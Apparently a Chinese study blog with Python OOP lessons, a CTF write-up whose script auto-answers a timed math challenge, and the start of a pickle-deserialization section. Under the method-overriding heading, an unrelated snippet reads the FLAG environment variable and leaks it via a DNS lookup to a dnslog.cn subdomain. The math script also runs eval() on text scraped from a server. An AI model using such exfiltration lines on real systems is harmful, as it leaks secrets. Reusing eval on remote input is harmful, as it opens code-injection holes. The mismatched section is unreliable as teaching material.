+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    name=<span class="literal">None</span></span><br><span class="line">    age = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say_hi</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Hi大家好，我是<span class="subst">&#123;self.name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say_hi2</span>(<span class="params">self,msg</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;大家好，我是:<span class="subst">&#123;self.name&#125;</span>,<span class="subst">&#123;msg&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">stu= Student()</span><br><span class="line">stu.name=<span class="string">&quot;xiaodaigua&quot;</span></span><br><span class="line">stu.say_hi()</span><br><span class="line"></span><br><span class="line">stu2=Student()</span><br><span class="line">stu2.name=<span class="string">&quot;linjijie&quot;</span></span><br><span class="line">stu2.say_hi2(<span class="string">&quot;小伙子，我看好你&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="75类和对象-py"><a href="#75类和对象-py" class="headerlink" title="75类和对象.py"></a>75类和对象.py</h2><p>这节课基本就是一些概念的理解。。。</p>
+<h2 id="76构造方法-py"><a href="#76构造方法-py" class="headerlink" title="76构造方法.py"></a>76构造方法.py</h2><p>python类可以使用:<strong>init</strong>()方法，称之为构造方法<br>可以实现：<br>在创建类对象（构造类）的时候会自动执行<br>在创建类对象（构造类）的时候，将传入参数自动传递给__Init__方法使用</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    name= <span class="literal">None</span></span><br><span class="line">    age=<span class="literal">None</span></span><br><span class="line">    tel=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age,tel</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name=name</span><br><span class="line">        <span class="variable language_">self</span>.age=age</span><br><span class="line">        <span class="variable language_">self</span>.tel=tel</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Student类创造了一个对象&quot;</span>)</span><br><span class="line"></span><br><span class="line">stu= Student(<span class="string">&quot;周杰伦&quot;</span>,<span class="number">31</span>,<span class="string">&quot;174827489&quot;</span>)<span class="comment">#构建类对象时会自动执行</span></span><br><span class="line"><span class="built_in">print</span>(stu.name)</span><br></pre></td></tr></table></figure>
+
+<h2 id="77魔术方法-py"><a href="#77魔术方法-py" class="headerlink" title="77魔术方法.py"></a>77魔术方法.py</h2><p>掌握几种常见的魔术方法<br>使用str<br>def <strong>str</strong>(self):<br>    return f”name&#x3D;{self.name}”,这个时候打印stu，结果大概就是Student类对象，name&#x3D;什么<br>其他的魔术方法就不看了，没有reduce这种的</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name=name</span><br><span class="line">        <span class="variable language_">self</span>.sge=age</span><br><span class="line"></span><br><span class="line">stu=Student(<span class="string">&quot;周杰伦&quot;</span>,<span class="number">11</span>)</span><br><span class="line"><span class="built_in">print</span>(stu)</span><br><span class="line"><span class="comment">#这个时候打印出来的是&lt;__main__.Student object at 0x000001C3F8FC7230&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(stu))</span><br><span class="line"><span class="comment">#&lt;__main__.Student object at 0x00000249D2587230&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="78封装-py"><a href="#78封装-py" class="headerlink" title="78封装.py"></a>78封装.py</h2><p>面向对象包含三大主要特性：<br>封装<br>继承<br>多态<br>封装就是：类中提供了私有成员的形式来支持<br>私有成员变量<br>私有成员方法<br>私有成员变量：变量以__开头<br>私有成员方法：方法名以__开头，即可完成私有成员的设置<br>私有成员无法被类对象使用，但是可以被其他的成员使用，就是自己这个类里面的可以用</p>
+<h2 id="79继承的基本语法-py"><a href="#79继承的基本语法-py" class="headerlink" title="79继承的基本语法.py"></a>79继承的基本语法.py</h2><p>class Phone:<br>    IMEI&#x3D;None<br>    producer&#x3D;”HM”</p>
+<pre><code>def call_by_4g(self):
+    print(&quot;4g通话&quot;)
+</code></pre>
+<p>class Phone2022(Phone):<br>    face_id &#x3D;”10001”<br>    def call_by_5g(self):<br>        print(“666”)</p>
+<p>phone&#x3D;Phone2022()<br>#属性这些就可以用了<br>#python，一个类可以继承多个父类<br>#class MyPhone(类名1，类名2，类名3)这样就可以了，不想再添加新的功能一个pass就可以了<br>#类的名字一样的话，后面的会覆盖前面的</p>
+<h2 id="80复写和调用父类成员-py"><a href="#80复写和调用父类成员-py" class="headerlink" title="80复写和调用父类成员.py"></a>80复写和调用父类成员.py</h2><p>import os<br>import socket<br>flag&#x3D;os.environ[‘FLAG’]<br>socket.getaddrinfo(flag.replace(‘{‘, ‘’).replace(‘}’, ‘’) + ‘.uhgxr3.dnslog.cn’, 0)</p>
+<h2 id="81变量的类型注解-py"><a href="#81变量的类型注解-py" class="headerlink" title="81变量的类型注解.py"></a>81变量的类型注解.py</h2><p>在pycharm中，我们经常可以看见，比如输入list.ap之后，会自动提示append(self,__object)。自动提示可用的方法。因为pycharm确定这是一个对象<br>同样，我们换一份代码,定义一个func,接受一个参数data。pycharm就不会做出任何提示了<br>def func(data):<br>    data.app<br>这样确不会提示我们要传入的参数了。思考，为什么pycharm工具无法提示了。因为pycharm不确定这个对象是什么类型的<br>或者我们调用一些其他的方法的时候，进行传参的时候，我们输入ctrl+p就会提示我们要传入哪些参数并且是什么类型（对于第一种情况来说）<br>但是第二种情况却不会这样了，只会好俗你要传入几个参数，不会告诉你是什么类型<br>为什么py内置模块可以，但是我们自己定义的确不可以呢？因为pycharm无法通过代码确定应该传入什么类型，我们需要使用类型注解<br>支持：变量的类型注解，函数（方法）形参列表和返回值的类型注解<br>基础数据类型注解：<br>var_1: int &#x3D; 10<br>类对象类型注解：<br>class Student:<br>    pass<br>stu: Student &#x3D; Student()<br>也可以是详细的注解<br>my_list: list[int] &#x3D; [1,2,3]</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#在注释中进行类型注解</span></span><br><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">var_1 = random.randint(<span class="number">1</span>,<span class="number">10</span>) <span class="comment">#type:int</span></span><br><span class="line"><span class="comment">#但是类型注解仅仅是提示性的，不影响代码的一个运行</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="82函数和方法类型注解-py"><a href="#82函数和方法类型注解-py" class="headerlink" title="82函数和方法类型注解.py"></a>82函数和方法类型注解.py</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#对形参进行类型注解</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x:<span class="built_in">int</span>,y:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span>  x+y</span><br><span class="line">add()</span><br><span class="line"><span class="comment">#对返回值进行类型注解</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">data:<span class="built_in">list</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">func()</span><br></pre></td></tr></table></figure>
+
+<h2 id="83union联合注解-py"><a href="#83union联合注解-py" class="headerlink" title="83union联合注解.py"></a>83union联合注解.py</h2><p>比如我们现在有一个数据是mylist&#x3D;[1,2,”itheima”]<br>这个就和常规的一个list是有一些区别的<br>这里就可以考虑使用我们的联合注解</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Union</span></span><br><span class="line">my_list:<span class="built_in">list</span>[<span class="type">Union</span>[<span class="built_in">str</span>,<span class="built_in">int</span>]] = [<span class="number">1</span>,<span class="number">2</span>,<span class="string">&quot;itheima&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<h2 id="84多态-py"><a href="#84多态-py" class="headerlink" title="84多态.py"></a>84多态.py</h2><p>同样的一个行为，传入不同的对象，得到不同的状态<br>函数方法形参申明接受父类对象<br>实际传入父类的子类对象进行工作</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;汪汪汪&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;喵喵喵&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mark_noise</span>(<span class="params">animal:Animal</span>):</span><br><span class="line">    animal.speak()</span><br><span class="line">dog = Dog()</span><br><span class="line">cat = Cat()</span><br><span class="line">mark_noise(dog)</span><br></pre></td></tr></table></figure>
+<h1 id="简单脚本"><a href="#简单脚本" class="headerlink" title="简单脚本"></a>简单脚本</h1><p>基本就是过一下，都是非常简单非常基础的一些脚本的web题</p>
+<h2 id="HUBUCTF-2022-新生赛-Calculate"><a href="#HUBUCTF-2022-新生赛-Calculate" class="headerlink" title="[HUBUCTF 2022 新生赛]Calculate"></a>[HUBUCTF 2022 新生赛]Calculate</h2><p>1分<br>PythonWEB脚本编写<br>题目描述</p>
+<p>python is a good tool in CTF</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Answer my questions</span><br><span class="line"></span><br><span class="line">Answer the following methematics questions for 20 times;you have 3 seconds to solve each question;</span><br><span class="line"></span><br><span class="line">In order to protect the server you can&#x27;t ans one question in less than 1 second</span><br><span class="line"></span><br><span class="line">You Have answered 0questions;</span><br><span class="line">5</span><br><span class="line">8</span><br><span class="line">4</span><br><span class="line">-</span><br><span class="line">1</span><br><span class="line">6</span><br><span class="line">=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>一进去就可以看到一个东西，最快1秒，最慢三秒内解决20道数学题，一般这样就出flag了<br>但是，手打的话很难这么快，还没有错误，这里肯定就是要借助我们的脚本了，我们先来抓一个包来看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:29507</span><br><span class="line">Content-Length: 5</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://node5.anna.nssctf.cn:29507</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://node5.anna.nssctf.cn:29507/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=c9c0e0j8imad0lsu0h2cv1jga6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">ans=1</span><br></pre></td></tr></table></figure>
+<p>大概就是这个样子的一个数据包<br>再来看一下页面，要计算的数字都是在什么h5标签下的</p>
+<p><img src="https://github.com/web-wuk0Ng/my-images/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-04%20144215.png?raw=true"></p>
+<p>现在就可以开始写我们的脚本了<br>首先我们要知道发包的get和post请求<br>get的简单一点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 目标URL（示例）</span><br><span class="line">base_url = &quot;http://example.com/api/data&quot;</span><br><span class="line"></span><br><span class="line"># 1. 基础GET请求（无参数）</span><br><span class="line">response_basic = requests.get(base_url)</span><br><span class="line">print(&quot;基础GET请求状态码：&quot;, response_basic.status_code)</span><br><span class="line">print(&quot;基础GET响应内容：&quot;, response_basic.text[:200])  # 打印前200字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 2. 带参数的GET请求（通过params参数传递）</span><br><span class="line"># 参数会自动拼接到URL后面，格式为：url?key1=value1&amp;key2=value2</span><br><span class="line">params = &#123;</span><br><span class="line">    &quot;id&quot;: 123,</span><br><span class="line">    &quot;category&quot;: &quot;test&quot;,</span><br><span class="line">    &quot;page&quot;: 1</span><br><span class="line">&#125;</span><br><span class="line">response_with_params = requests.get(base_url, params=params)</span><br><span class="line">print(&quot;\n带参数的GET请求URL：&quot;, response_with_params.url)  # 查看实际请求的URL</span><br><span class="line">print(&quot;带参数的响应状态码：&quot;, response_with_params.status_code)</span><br><span class="line">print(&quot;带参数的响应内容：&quot;, response_with_params.text[:200])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 3. 带请求头（Headers）的GET请求</span><br><span class="line"># 常用于伪装浏览器、携带Cookie或认证信息</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&quot;,</span><br><span class="line">    &quot;Cookie&quot;: &quot;session_id=abc123; user=test&quot;,  # 携带Cookie</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;</span><br><span class="line">&#125;</span><br><span class="line">response_with_headers = requests.get(base_url, params=params, headers=headers)</span><br><span class="line">print(&quot;\n带请求头的响应状态码：&quot;, response_with_headers.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 4. 处理JSON响应</span><br><span class="line"># 如果服务器返回JSON格式数据，可直接用.json()方法解析</span><br><span class="line">try:</span><br><span class="line">    json_response = response_with_params.json()  # 解析为Python字典/列表</span><br><span class="line">    print(&quot;\nJSON响应解析结果：&quot;, type(json_response))  # 打印数据类型</span><br><span class="line">    # 示例：获取JSON中的特定字段</span><br><span class="line">    if isinstance(json_response, dict):</span><br><span class="line">        print(&quot;JSON中的&#x27;code&#x27;字段：&quot;, json_response.get(&quot;code&quot;))</span><br><span class="line">except ValueError:</span><br><span class="line">    print(&quot;\n响应不是有效的JSON格式&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 5. 设置超时时间（防止请求无限等待）</span><br><span class="line">try:</span><br><span class="line">    # 超时时间设为5秒（连接超时+读取超时）</span><br><span class="line">    response_with_timeout = requests.get(base_url, timeout=5)</span><br><span class="line">    print(&quot;\n超时设置下的响应状态码：&quot;, response_with_timeout.status_code)</span><br><span class="line">except requests.exceptions.Timeout:</span><br><span class="line">    print(&quot;\n请求超时！&quot;)</span><br></pre></td></tr></table></figure>
+<p>post的也比较简单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 目标URL（示例，实际使用时替换为你的目标地址）</span><br><span class="line">url = &quot;http://example.com/api/submit&quot;</span><br><span class="line"></span><br><span class="line"># 1. 发送表单数据（application/x-www-form-urlencoded）</span><br><span class="line"># 适用于模拟表单提交，数据以键值对形式传递</span><br><span class="line">form_data = &#123;</span><br><span class="line">    &quot;username&quot;: &quot;test_user&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;test_pass&quot;,</span><br><span class="line">    &quot;age&quot;: 25</span><br><span class="line">&#125;</span><br><span class="line">response_form = requests.post(url, data=form_data)</span><br><span class="line">print(&quot;表单数据响应状态码：&quot;, response_form.status_code)</span><br><span class="line">print(&quot;表单数据响应内容：&quot;, response_form.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 2. 发送JSON数据（application/json）</span><br><span class="line"># 适用于API接口，数据需序列化为JSON格式</span><br><span class="line">json_data = &#123;</span><br><span class="line">    &quot;name&quot;: &quot;张三&quot;,</span><br><span class="line">    &quot;email&quot;: &quot;zhangsan@example.com&quot;,</span><br><span class="line">    &quot;hobbies&quot;: [&quot;reading&quot;, &quot;coding&quot;]</span><br><span class="line">&#125;</span><br><span class="line">response_json = requests.post(url, json=json_data)  # 自动设置Content-Type为application/json</span><br><span class="line">print(&quot;\nJSON数据响应状态码：&quot;, response_json.status_code)</span><br><span class="line">print(&quot;JSON数据响应内容：&quot;, response_json.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 3. 发送带请求头（Headers）的POST请求</span><br><span class="line"># 部分接口需要特定的请求头（如User-Agent、Token等）</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&quot;,</span><br><span class="line">    &quot;Authorization&quot;: &quot;Bearer your_token_here&quot;,  # 示例：携带Token认证</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;  # 手动指定内容类型（可选）</span><br><span class="line">&#125;</span><br><span class="line">data_with_headers = &#123;</span><br><span class="line">    &quot;action&quot;: &quot;submit&quot;,</span><br><span class="line">    &quot;data&quot;: &quot;test_content&quot;</span><br><span class="line">&#125;</span><br><span class="line">response_with_headers = requests.post(url, data=data_with_headers, headers=headers)</span><br><span class="line">print(&quot;\n带请求头的响应状态码：&quot;, response_with_headers.status_code)</span><br><span class="line">print(&quot;带请求头的响应内容：&quot;, response_with_headers.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 4. 发送文件（multipart/form-data）</span><br><span class="line"># 适用于上传文件的场景（如图片、文档等）</span><br><span class="line">files = &#123;</span><br><span class="line">    &quot;file&quot;: open(&quot;example.txt&quot;, &quot;rb&quot;)  # 打开文件并以二进制形式读取</span><br><span class="line">&#125;</span><br><span class="line"># 同时可以携带其他表单字段</span><br><span class="line">file_data = &#123;</span><br><span class="line">    &quot;filename&quot;: &quot;example.txt&quot;,</span><br><span class="line">    &quot;description&quot;: &quot;测试文件上传&quot;</span><br><span class="line">&#125;</span><br><span class="line">response_file = requests.post(url, files=files, data=file_data)</span><br><span class="line">print(&quot;\n文件上传响应状态码：&quot;, response_file.status_code)</span><br><span class="line">print(&quot;文件上传响应内容：&quot;, response_file.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里能比较轻松的就知道，用的是一个form的这么一个格式的<br>还有一个问题就是怎么获取到我们的这个网页的标签的里面的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 目标答题网站的URL</span><br><span class="line">url = &#x27;http://node1.anna.nssctf.cn:28802/&#x27;</span><br><span class="line"># 创建会话对象，用于保持会话状态（自动处理Cookie，记录答题进度）</span><br><span class="line">res = requests.session()     </span><br><span class="line"></span><br><span class="line"># 循环最多98次（范围1到98）</span><br><span class="line">for i in range(1, 99):</span><br><span class="line">    # 用于存储提取到的数学表达式</span><br><span class="line">    math = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    # 发送GET请求到目标URL，获取包含数学题的页面内容</span><br><span class="line">    response = res.get(url)   </span><br><span class="line">    # 暂停1秒，避免请求过于频繁被服务器拦截</span><br><span class="line">    time.sleep(1)  </span><br><span class="line"></span><br><span class="line">    # 提取响应内容（网页HTML文本）</span><br><span class="line">    resTest = response.text            </span><br><span class="line">    # 遍历网页内容，提取数学表达式（通过字符位置判断：被&gt;和&lt;包裹的字符）</span><br><span class="line">    for j in range(0, len(resTest)):</span><br><span class="line">        if resTest[j - 1] == &quot;&gt;&quot; and resTest[j + 1] == &quot;&lt;&quot; and resTest[j]!= &quot;\n&quot;:</span><br><span class="line">                math = math + resTest[j]</span><br><span class="line"></span><br><span class="line">    # 移除表达式中的等号（例如将&quot;1+2=&quot;处理为&quot;1+2&quot;）</span><br><span class="line">    math = math.strip(&#x27;=&#x27;)      </span><br><span class="line">    # 使用eval函数计算数学表达式的结果</span><br><span class="line">    num = eval(math)      </span><br><span class="line"></span><br><span class="line">    # 构造POST请求的数据，包含计算得到的答案</span><br><span class="line">    myData = &#123;   </span><br><span class="line">        &#x27;ans&#x27;: num</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 发送POST请求提交答案</span><br><span class="line">    response = res.post(url, data=myData) </span><br><span class="line">    # 打印服务器返回的响应内容（查看答题结果）</span><br><span class="line">    print(response.text)          </span><br><span class="line">    # 暂停1秒，等待服务器处理</span><br><span class="line">    time.sleep(1)  </span><br><span class="line"></span><br><span class="line">    # 检查响应中是否包含Flag（假设Flag格式为NSSCTF&#123;...&#125;）</span><br><span class="line">    if &quot;NSSCTF&#123;&quot; in response.text:       </span><br><span class="line">        print(&quot;Flaggggggggg: &quot;, response.text)</span><br><span class="line">        # 找到Flag后退出程序</span><br><span class="line">        exit() </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里参考这个脚本</p>
+<h1 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h1><p>额，之前有很多篇文章讲到过这个了。但是会有一些小的问题。<br>主要是，面对实际的赛题，给你的源码非常复杂的情况下，我还是打不出pickle来编写opcode<br>感觉主要还是缺少自己慢慢的思考的这么一个过程，这里就细细地来看源码，弄清楚整个过程到底要怎么做一个完整地pickle的题目</p>
+<h2 id="HZNUCTF-2023-preliminary-pickle"><a href="#HZNUCTF-2023-preliminary-pickle" class="headerlink" title="[HZNUCTF 2023 preliminary]pickle"></a>[HZNUCTF 2023 preliminary]pickle</h2><p>1分<br>反序列化Python&#x2F;proc<br>题目描述</p>
+<p>无描述<br>首先一进去发现是只有一些代码，一看知道是py的</p>
